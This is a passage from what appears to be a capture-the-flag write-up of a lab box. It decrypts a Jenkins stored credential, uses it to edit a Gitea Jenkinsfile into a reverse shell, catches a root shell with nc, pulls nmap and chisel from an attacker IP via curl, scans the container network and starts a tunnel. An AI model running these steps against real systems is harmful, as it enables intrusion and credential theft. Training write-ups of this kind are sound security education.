+<span class="nt">&lt;jenkins.branch.OrganizationFolder</span> <span class="na">plugin=</span><span class="s">"branch-api@2.1163.va_f1064e4a_a_f3"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;actions/&gt;</span>
+  <span class="nt">&lt;description&gt;</span>dev<span class="nt">&lt;/description&gt;</span>
+  <span class="nt">&lt;displayName&gt;</span>dev<span class="nt">&lt;/displayName&gt;</span>
+  <span class="nt">&lt;properties&gt;</span>
+    <span class="nt">&lt;jenkins.branch.OrganizationChildHealthMetricsProperty&gt;</span>
+      <span class="nt">&lt;templates&gt;</span>
+        <span class="nt">&lt;com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric</span> <span class="na">plugin=</span><span class="s">"cloudbees-folder@6.901.vb_4c7a_da_75da_3"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;nonRecursive&gt;</span>false<span class="nt">&lt;/nonRecursive&gt;</span>
+        <span class="nt">&lt;/com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric&gt;</span>
+      <span class="nt">&lt;/templates&gt;</span>
+    <span class="nt">&lt;/jenkins.branch.OrganizationChildHealthMetricsProperty&gt;</span>
+    <span class="nt">&lt;jenkins.branch.OrganizationChildOrphanedItemsProperty&gt;</span>
+      <span class="nt">&lt;strategy</span> <span class="na">class=</span><span class="s">"jenkins.branch.OrganizationChildOrphanedItemsProperty$Inherit"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/jenkins.branch.OrganizationChildOrphanedItemsProperty&gt;</span>
+    <span class="nt">&lt;jenkins.branch.OrganizationChildTriggersProperty&gt;</span>
+      <span class="nt">&lt;templates&gt;</span>
+        <span class="nt">&lt;com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger</span> <span class="na">plugin=</span><span class="s">"cloudbees-folder@6.901.vb_4c7a_da_75da_3"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;spec&gt;</span>H H/4 * * *<span class="nt">&lt;/spec&gt;</span>
+          <span class="nt">&lt;interval&gt;</span>86400000<span class="nt">&lt;/interval&gt;</span>
+        <span class="nt">&lt;/com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger&gt;</span>
+      <span class="nt">&lt;/templates&gt;</span>
+    <span class="nt">&lt;/jenkins.branch.OrganizationChildTriggersProperty&gt;</span>
+    <span class="nt">&lt;com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty</span> <span class="na">plugin=</span><span class="s">"cloudbees-folder@6.901.vb_4c7a_da_75da_3"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;domainCredentialsMap</span> <span class="na">class=</span><span class="s">"hudson.util.CopyOnWriteMap$Hash"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;entry&gt;</span>
+          <span class="nt">&lt;com.cloudbees.plugins.credentials.domains.Domain</span> <span class="na">plugin=</span><span class="s">"credentials@1337.v60b_d7b_c7b_c9f"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;specifications/&gt;</span>
+          <span class="nt">&lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;</span>
+          <span class="nt">&lt;java.util.concurrent.CopyOnWriteArrayList&gt;</span>
+            <span class="nt">&lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl</span> <span class="na">plugin=</span><span class="s">"credentials@1337.v60b_d7b_c7b_c9f"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;id&gt;</span>e4048737-7acd-46fd-86ef-a3db45683d4f<span class="nt">&lt;/id&gt;</span>
+              <span class="nt">&lt;description&gt;&lt;/description&gt;</span>
+              <span class="nt">&lt;username&gt;</span>buildadm<span class="nt">&lt;/username&gt;</span>
+              <span class="nt">&lt;password&gt;</span>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}<span class="nt">&lt;/password&gt;</span>
+              <span class="nt">&lt;usernameSecret&gt;</span>false<span class="nt">&lt;/usernameSecret&gt;</span>
+            <span class="nt">&lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;</span>
+          <span class="nt">&lt;/java.util.concurrent.CopyOnWriteArrayList&gt;</span>
+        <span class="nt">&lt;/entry&gt;</span>
+      <span class="nt">&lt;/domainCredentialsMap&gt;</span>
+    <span class="nt">&lt;/com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty&gt;</span>
+    <span class="nt">&lt;jenkins.branch.NoTriggerOrganizationFolderProperty&gt;</span>
+      <span class="nt">&lt;branches&gt;</span>.*<span class="nt">&lt;/branches&gt;</span>
+      <span class="nt">&lt;strategy&gt;</span>NONE<span class="nt">&lt;/strategy&gt;</span>
+    <span class="nt">&lt;/jenkins.branch.NoTriggerOrganizationFolderProperty&gt;</span>
+  <span class="nt">&lt;/properties&gt;</span>
+  <span class="nt">&lt;folderViews</span> <span class="na">class=</span><span class="s">"jenkins.branch.OrganizationFolderViewHolder"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;owner</span> <span class="na">reference=</span><span class="s">"../.."</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/folderViews&gt;</span>
+  <span class="nt">&lt;healthMetrics/&gt;</span>
+  <span class="nt">&lt;icon</span> <span class="na">class=</span><span class="s">"jenkins.branch.MetadataActionFolderIcon"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;owner</span> <span class="na">class=</span><span class="s">"jenkins.branch.OrganizationFolder"</span> <span class="na">reference=</span><span class="s">"../.."</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/icon&gt;</span>
+  <span class="nt">&lt;orphanedItemStrategy</span> <span class="na">class=</span><span class="s">"com.cloudbees.hudson.plugins.folder.computed.DefaultOrphanedItemStrategy"</span> <span class="na">plugin=</span><span class="s">"cloudbees-folder@6.901.vb_4c7a_da_75da_3"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;pruneDeadBranches&gt;</span>true<span class="nt">&lt;/pruneDeadBranches&gt;</span>
+    <span class="nt">&lt;daysToKeep&gt;</span>-1<span class="nt">&lt;/daysToKeep&gt;</span>
+    <span class="nt">&lt;numToKeep&gt;</span>-1<span class="nt">&lt;/numToKeep&gt;</span>
+    <span class="nt">&lt;abortBuilds&gt;</span>false<span class="nt">&lt;/abortBuilds&gt;</span>
+  <span class="nt">&lt;/orphanedItemStrategy&gt;</span>
+  <span class="nt">&lt;triggers&gt;</span>
+    <span class="nt">&lt;com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger</span> <span class="na">plugin=</span><span class="s">"cloudbees-folder@6.901.vb_4c7a_da_75da_3"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;spec&gt;</span>* * * * *<span class="nt">&lt;/spec&gt;</span>
+      <span class="nt">&lt;interval&gt;</span>60000<span class="nt">&lt;/interval&gt;</span>
+    <span class="nt">&lt;/com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger&gt;</span>
+  <span class="nt">&lt;/triggers&gt;</span>
+  <span class="nt">&lt;disabled&gt;</span>false<span class="nt">&lt;/disabled&gt;</span>
+  <span class="nt">&lt;navigators&gt;</span>
+    <span class="nt">&lt;org.jenkinsci.plugin.gitea.GiteaSCMNavigator</span> <span class="na">plugin=</span><span class="s">"gitea@1.4.7"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;serverUrl&gt;</span>http://172.18.0.2:3000<span class="nt">&lt;/serverUrl&gt;</span>
+      <span class="nt">&lt;repoOwner&gt;</span>buildadm<span class="nt">&lt;/repoOwner&gt;</span>
+      <span class="nt">&lt;credentialsId&gt;</span>e4048737-7acd-46fd-86ef-a3db45683d4f<span class="nt">&lt;/credentialsId&gt;</span>
+      <span class="nt">&lt;traits&gt;</span>
+        <span class="nt">&lt;org.jenkinsci.plugin.gitea.BranchDiscoveryTrait&gt;</span>
+          <span class="nt">&lt;strategyId&gt;</span>1<span class="nt">&lt;/strategyId&gt;</span>
+        <span class="nt">&lt;/org.jenkinsci.plugin.gitea.BranchDiscoveryTrait&gt;</span>
+        <span class="nt">&lt;org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait&gt;</span>
+          <span class="nt">&lt;strategyId&gt;</span>1<span class="nt">&lt;/strategyId&gt;</span>
+        <span class="nt">&lt;/org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait&gt;</span>
+        <span class="nt">&lt;org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait&gt;</span>
+          <span class="nt">&lt;strategyId&gt;</span>1<span class="nt">&lt;/strategyId&gt;</span>
+          <span class="nt">&lt;trust</span> <span class="na">class=</span><span class="s">"org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait$TrustContributors"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait&gt;</span>
+      <span class="nt">&lt;/traits&gt;</span>
+    <span class="nt">&lt;/org.jenkinsci.plugin.gitea.GiteaSCMNavigator&gt;</span>
+  <span class="nt">&lt;/navigators&gt;</span>
+  <span class="nt">&lt;projectFactories&gt;</span>
+    <span class="nt">&lt;org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory</span> <span class="na">plugin=</span><span class="s">"workflow-multibranch@773.vc4fe1378f1d5"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;scriptPath&gt;</span>Jenkinsfile<span class="nt">&lt;/scriptPath&gt;</span>
+    <span class="nt">&lt;/org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory&gt;</span>
+  <span class="nt">&lt;/projectFactories&gt;</span>
+  <span class="nt">&lt;buildStrategies/&gt;</span>
+  <span class="nt">&lt;strategy</span> <span class="na">class=</span><span class="s">"jenkins.branch.DefaultBranchPropertyStrategy"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;properties</span> <span class="na">class=</span><span class="s">"empty-list"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/strategy&gt;</span>
+<span class="nt">&lt;/jenkins.branch.OrganizationFolder&gt;</span>
+</code></pre></div></div>
+<p>I’ll cover the highlights. It’s connected to a Gitea server at 172.18.0.2:3000:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;navigators&gt;</span>
+    <span class="nt">&lt;org.jenkinsci.plugin.gitea.GiteaSCMNavigator</span> <span class="na">plugin=</span><span class="s">"gitea@1.4.7"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;serverUrl&gt;</span>http://172.18.0.2:3000<span class="nt">&lt;/serverUrl&gt;</span>
+      <span class="nt">&lt;repoOwner&gt;</span>buildadm<span class="nt">&lt;/repoOwner&gt;</span>
+      <span class="nt">&lt;credentialsId&gt;</span>e4048737-7acd-46fd-86ef-a3db45683d4f<span class="nt">&lt;/credentialsId&gt;</span>
+      <span class="nt">&lt;traits&gt;</span>
+        <span class="nt">&lt;org.jenkinsci.plugin.gitea.BranchDiscoveryTrait&gt;</span>
+          <span class="nt">&lt;strategyId&gt;</span>1<span class="nt">&lt;/strategyId&gt;</span>
+        <span class="nt">&lt;/org.jenkinsci.plugin.gitea.BranchDiscoveryTrait&gt;</span>
+        <span class="nt">&lt;org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait&gt;</span>
+          <span class="nt">&lt;strategyId&gt;</span>1<span class="nt">&lt;/strategyId&gt;</span>
+        <span class="nt">&lt;/org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait&gt;</span>
+        <span class="nt">&lt;org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait&gt;</span>
+          <span class="nt">&lt;strategyId&gt;</span>1<span class="nt">&lt;/strategyId&gt;</span>
+          <span class="nt">&lt;trust</span> <span class="na">class=</span><span class="s">"org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait$TrustContributors"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait&gt;</span>
+      <span class="nt">&lt;/traits&gt;</span>
+    <span class="nt">&lt;/org.jenkinsci.plugin.gitea.GiteaSCMNavigator&gt;</span>
+  <span class="nt">&lt;/navigators&gt;</span>
+</code></pre></div></div>
+<p>This is almost certainly the one I’ve interacted with, and it’s likely running in a container given the default Docker IP range.</p>
+<p>There’s a trigger every minute:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;triggers&gt;</span>
+    <span class="nt">&lt;com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger</span> <span class="na">plugin=</span><span class="s">"cloudbees-folder@6.901.vb_4c7a_da_75da_3"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;spec&gt;</span>* * * * *<span class="nt">&lt;/spec&gt;</span>
+      <span class="nt">&lt;interval&gt;</span>60000<span class="nt">&lt;/interval&gt;</span>
+    <span class="nt">&lt;/com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger&gt;</span>
+  <span class="nt">&lt;/triggers&gt;</span>
+</code></pre></div></div>
+<p>When this triggers it looks for changes in repos on the server and triggers build jobs and makes sure there’s a <code class="language-plaintext highlighter-rouge">Jenkinsfile</code> in the repo.</p>
+<p>This section runs that file:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;projectFactories&gt;</span>
+    <span class="nt">&lt;org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory</span> <span class="na">plugin=</span><span class="s">"workflow-multibranch@773.vc4fe1378f1d5"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;scriptPath&gt;</span>Jenkinsfile<span class="nt">&lt;/scriptPath&gt;</span>
+    <span class="nt">&lt;/org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory&gt;</span>
+  <span class="nt">&lt;/projectFactories&gt;</span>
+</code></pre></div></div>
+<p>There’s a set of credentials for the buildadm user:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="nt">&lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl</span> <span class="na">plugin=</span><span class="s">"credentials@1337.v60b_d7b_c7b_c9f"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;id&gt;</span>e4048737-7acd-46fd-86ef-a3db45683d4f<span class="nt">&lt;/id&gt;</span>
+              <span class="nt">&lt;description&gt;&lt;/description&gt;</span>
+              <span class="nt">&lt;username&gt;</span>buildadm<span class="nt">&lt;/username&gt;</span>
+              <span class="nt">&lt;password&gt;</span>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}<span class="nt">&lt;/password&gt;</span>
+              <span class="nt">&lt;usernameSecret&gt;</span>false<span class="nt">&lt;/usernameSecret&gt;</span>
+            <span class="nt">&lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;</span>
+</code></pre></div></div>
+<p>The password is encrypted.</p>
+<h4 id="decrypt-password">Decrypt Password</h4>
+<p>In <a href="/2022/02/28/htb-object.html#decrypt-password">Object</a>, I used <a href="https://github.com/hoto/jenkins-credentials-decryptor">jenkins-credentials-decryptor</a> to decrypt offline. I’ll grab the binary using the <code class="language-plaintext highlighter-rouge">curl</code> command from the repo README:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-L</span> <span class="se">\</span>
+<span class="gp">  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.2/jenkins-credentials-decryptor_1.2.2_$</span><span class="o">(</span><span class="nb">uname</span> <span class="nt">-s</span><span class="o">)</span>_<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span><span class="s2">" </span><span class="se">\</span><span class="s2">
+</span><span class="go">   -o jenkins-credentials-decryptor
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100 2348k  100 2348k    0     0  8281k      0 --:--:-- --:--:-- --:--:-- 8281k
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">chmod</span> +x jenkins-credentials-decryptor
+</code></pre></div></div>
+<p>It needs the master key, the Hudson secret, and the config file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./jenkins-credentials-decryptor <span class="nt">-m</span> jenkins_configuration/secrets/master.key <span class="nt">-s</span> jenkins_configuration/secrets/hudson.util.Secret <span class="nt">-c</span> jenkins_configuration/jobs/build/config.xml 
+<span class="go">[
+  {
+    "id": "e4048737-7acd-46fd-86ef-a3db45683d4f",
+    "password": "Git1234!",
+    "username": "buildadm"
+  }
+]
+</span></code></pre></div></div>
+<h2 id="shell-as-root-in-container">Shell as root in Container</h2>
+<h3 id="authenticated-gitea">Authenticated Gitea</h3>
+<p>The creds above do not work over SSH, but they do login to Gitea as buildadm:</p>
+<picture>
+<source srcset="/img/image-20250729173800735.webp" type="image/webp"/>
+<img alt="image-20250729173800735" class="include_image" loading="lazy" src="/img/image-20250729173800735.png"/>
+</picture>
+<p>Under settings it has the email that matches what I found <a href="/2025/08/05/htb-build.html#domains">above</a>:</p>
+<picture>
+<source srcset="/img/image-20250729173842919.webp" type="image/webp"/>
+<img alt="image-20250729173842919" class="include_image" loading="lazy" src="/img/image-20250729173842919.png"/>
+</picture>
+<p>Also in Settings there’s a webhook configured:</p>
+<picture>
+<source srcset="/img/image-20250729175646858.webp" type="image/webp"/>
+<img alt="image-20250729175646858" class="include_image" loading="lazy" src="/img/image-20250729175646858.png"/>
+</picture>
+<p>I’ll later see that’s the Jenkins container IP.</p>
+<h3 id="shell">Shell</h3>
+<p>I’ll use the Gitea built in editor to open <code class="language-plaintext highlighter-rouge">Jenkinsfile</code> in the dev repo and edit the command to a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+<picture>
+<source srcset="/img/image-20250729174002310.webp" type="image/webp"/>
+<img alt="image-20250729174002310" class="include_image" loading="lazy" src="/img/image-20250729174002310.png"/>
+</picture>
+<p>At the bottom, I’ll add a commit message and “Commit Changes”:</p>
+<picture>
+<source srcset="/img/image-20250729174040433.webp" type="image/webp"/>
+<img alt="image-20250729174040433" class="include_image" loading="lazy" src="/img/image-20250729174040433.png"/>
+</picture>
+<p>Within a minute there’s a connection at my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.169 40080
+bash: cannot set terminal process group (7): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell using <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">the standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">Script started, output log file is '/dev/null'.
+</span><span class="gp">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">            ‍</span>reset
+<span class="go">reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#</span><span class="w"> 
+</span></code></pre></div></div>
+<p>The shell is running as root, and <code class="language-plaintext highlighter-rouge">user.txt</code> is in <code class="language-plaintext highlighter-rouge">/root</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">466098e1************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="container">Container</h4>
+<p>The hostname is twelve hex characters, which matches the Docker default. There’s a <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the filesystem root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:/#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span>
+<span class="go">.   .dockerenv  boot  etc   lib    lib64   media  opt   root  sbin  sys  usr
+..  bin         dev   home  lib32  libx32  mnt    proc  run   srv   tmp  var
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">ip</code> and <code class="language-plaintext highlighter-rouge">ifconfig</code> are not installed, but the IP is 172.18.0.3:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:/#</span><span class="w"> </span><span class="nb">cat</span> /proc/net/fib_trie
+<span class="go">Main:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.18.0.0/16 2 0 2
+        +-- 172.18.0.0/30 2 0 2
+           |-- 172.18.0.0
+              /16 link UNICAST
+           |-- 172.18.0.3
+              /32 host LOCAL
+        |-- 172.18.255.255
+           /32 link BROADCAST
+Local:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.18.0.0/16 2 0 2
+        +-- 172.18.0.0/30 2 0 2
+           |-- 172.18.0.0
+              /16 link UNICAST
+           |-- 172.18.0.3
+              /32 host LOCAL
+        |-- 172.18.255.255
+           /32 link BROADCAST
+</span></code></pre></div></div>
+<p>This is different from the Gitea container, which at least the config suggested was on .2.</p>
+<h4 id="container-filesystem">Container Filesystem</h4>
+<p>There’s really not much in this container. There are no user home directories in <code class="language-plaintext highlighter-rouge">/home</code>. <code class="language-plaintext highlighter-rouge">/opt</code> has a Java install and <code class="language-plaintext highlighter-rouge">jenkins-plugin-manager.jar</code>.</p>
+<p>root’s home directory has a couple things to note:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 20
+drwxr-xr-x 3 root root 4096 May  2  2024 .
+drwxr-xr-x 1 root root 4096 May  9  2024 ..
+lrwxrwxrwx 1 root root    9 May  1  2024 .bash_history -&gt; /dev/null
+-r-------- 1 root root   35 May  1  2024 .rhosts
+drwxr-xr-x 2 root root 4096 May  1  2024 .ssh
+-rw------- 1 root root   33 Apr 15 05:26 user.txt
+</span></code></pre></div></div>
+<p>There’s an SSH keypair in <code class="language-plaintext highlighter-rouge">.ssh</code>, but I won’t find anywhere to use it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span><span class="nb">ls</span> .ssh/
+<span class="go">authorized_keys  id_ed25519  id_ed25519.pub  known_hosts
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">.rhosts</code> configures the Berkeley r-commands, which are open from the outside:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span><span class="nb">cat</span> .rhosts 
+<span class="go">admin.build.vl +
+intern.build.vl +
+</span></code></pre></div></div>
+<p>This means the computers at <code class="language-plaintext highlighter-rouge">admin.build.vl</code> and <code class="language-plaintext highlighter-rouge">intern.build.vl</code> can connect without passwords.</p>
+<h4 id="network">Network</h4>
+<p>I’ll grab a copy of a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">static compiled nmap</a> and upload it to the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span>curl 10.10.14.79/nmap <span class="nt">-o</span> nmap                 
+<span class="go">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 5805k  100 5805k    0     0  5776k      0  0:00:01  0:00:01 --:--:-- 5782k
+</span><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span><span class="nb">chmod</span> +x nmap  
+</code></pre></div></div>
+<p>I’ll also want a copy of <code class="language-plaintext highlighter-rouge">/etc/services</code> from my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span>curl 10.10.14.79/services <span class="nt">-o</span> /etc/services    
+<span class="go">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 12813  100 12813    0     0  67475      0 --:--:-- --:--:-- --:--:-- 67793
+</span></code></pre></div></div>
+<p>Now I’ll scan the class C network:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span>./nmap 172.18.0.0/24 <span class="nt">--min-rate</span> 10000
+<span class="go">
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-07-29 22:19 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.18.0.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000019s latency).
+Not shown: 1148 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+873/tcp  open  rsync
+3306/tcp open  mysql
+8081/tcp open  tproxy
+MAC Address: 02:42:53:61:05:FB (Unknown)
+
+Nmap scan report for gitea.custom (172.18.0.2)
+Host is up (0.000028s latency).
+Not shown: 1155 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 02:42:AC:12:00:02 (Unknown)
+
+Nmap scan report for pdns-db-1.custom (172.18.0.4)
+Host is up (0.000024s latency).
+Not shown: 1155 closed ports
+PORT     STATE SERVICE
+3306/tcp open  mysql
+MAC Address: 02:42:AC:12:00:04 (Unknown)
+
+Nmap scan report for pdns-pdns-1.custom (172.18.0.5)
+Host is up (0.000029s latency).
+Not shown: 1154 closed ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+8081/tcp open  tproxy
+MAC Address: 02:42:AC:12:00:05 (Unknown)
+
+Nmap scan report for powerdns_admin.custom (172.18.0.6)
+Host is up (0.000023s latency).
+Not shown: 1155 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 02:42:AC:12:00:06 (Unknown)
+
+Nmap scan report for 5ac6c7d6fb8e (172.18.0.3)
+Host is up (0.0000090s latency).
+Not shown: 1155 closed ports
+PORT     STATE SERVICE
+8080/tcp open  http-alt
+
+Nmap done: 256 IP addresses (6 hosts up) scanned in 2.08 seconds
+</span></code></pre></div></div>
+<p>There’s 6 hosts:</p>
+<ul>
+<li>.1 - Host, with all the same ports are my initial scan. 3000 is missing as it’s not in the top ports scanned by default, and 3306 and 8081 open not filtered. Probably nothing unique here.</li>
+<li>.2 - <code class="language-plaintext highlighter-rouge">nmap</code> above shows SSH only, but another scan of all ports shows 3000 as well. This is Gitea.</li>
+<li>.3 - Webserver on 8080 is the Jenkins webhook from Gitea.</li>
+<li>.4 - 3306 open is MySQL.</li>
+<li>.5 - <code class="language-plaintext highlighter-rouge">nmap</code> shows both 53 and 8081, which is an interesting combination. <code class="language-plaintext highlighter-rouge">curl</code> on 8081 returns just a 401 unauthorized.</li>
+<li>.6 - Some kind of webserver on 80. A quick <code class="language-plaintext highlighter-rouge">curl</code> of this port redirects to <code class="language-plaintext highlighter-rouge">/login</code>, which shows a title of PowerDNS-Admin. This could be related to the open DNS ports on .5.</li>
+</ul>
+<h4 id="tunnel">Tunnel</h4>
+<p>I’ll use <a href="https://github.com/jpillora/chisel">Chisel</a> to create a proxy through my reverse shell to access the other containers from my VM. I’ll start the server on my host with <code class="language-plaintext highlighter-rouge">--reverse</code> to allow reverse connections and <code class="language-plaintext highlighter-rouge">-p 8000</code> because Burp is already listening on the default port of 8080 on my host. Next I’ll upload the latest Linux binary to the container, make it executable, and connect:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span>curl 10.10.14.79/chisel_1.10.0_linux_amd64 <span class="nt">-o</span> c
+<span class="go">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
